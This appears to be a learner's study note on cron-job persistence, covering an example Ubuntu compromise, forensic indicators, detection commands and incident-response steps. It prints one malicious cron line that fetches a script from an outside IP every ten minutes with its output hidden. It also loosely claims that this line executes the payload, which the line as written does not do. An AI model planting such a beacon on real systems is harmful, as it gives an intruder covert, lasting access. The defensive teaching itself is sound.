# Day 6 — Cron Jobs and Persistence Mechanisms

## What is Cron?

Cron is a task scheduler executing commands at specified intervals. Legitimate: backups, maintenance. Malicious: persistence and C2 beaconing.

## Cron Format
m h dom mon dow command
*/10 * * * * curl http://185.220.101.45/beacon.sh > /dev/null 2>&1
- `*/10` = Every 10 minutes
- Command = Download and execute attacker payload
- `> /dev/null 2>&1` = Hide output from user

## Real Case: Ubuntu System Compromise

**Timeline:** May 3, 00:10 → May 15, 03:30 (12+ days)
**Status:** ACTIVE and ONGOING
**Executions:** 390+ log entries in syslog

## Forensic Analysis

### Evidence of Compromise
- Cron job added to ubuntu user account
- External C2 connection every 10 minutes
- 390 execution logs (one every 10 mins for 12 days)
- Output redirected to hide from user

### Attacker Profile
This is a SCRIPT KIDDIE or TEST scenario, not professional:
- Left obvious cron job (easy to find with `crontab -l`)
- Named payload obviously (`beacon.sh`)
- Exact 10-minute intervals (randomization would be smarter)
- No log cleaning (left 390 traces)

Professional attacker would: hide in /etc/cron.d/, use obscure names, randomize intervals, clean logs regularly.

## Detection Strategy

1. **List crontabs:** `crontab -l` (user level) and `cat /etc/cron.d/*` (system level)
2. **Search logs:** `grep CRON /var/log/syslog | wc -l` (count executions)
3. **Analyze timing:** Look for regular intervals (every 5-15 mins = suspicious)
4. **Check domains:** Is the C2 IP legitimate? (185.220.101.45 is NOT)
5. **Timeline:** Earliest execution = when compromise occurred

## Response

1. Block C2 IP (185.220.101.45) at firewall
2. Remove malicious cron: `crontab -e` and delete the line
3. Search for other backdoors
4. Isolate system from network
5. Escalate to Incident Response

## Key Learning

Cron persistence is AUTOMATED — attacker sets it once, then disappears. Detection is TIME-BASED: look for machine-like patterns (regular intervals), not human behavior (random timing).
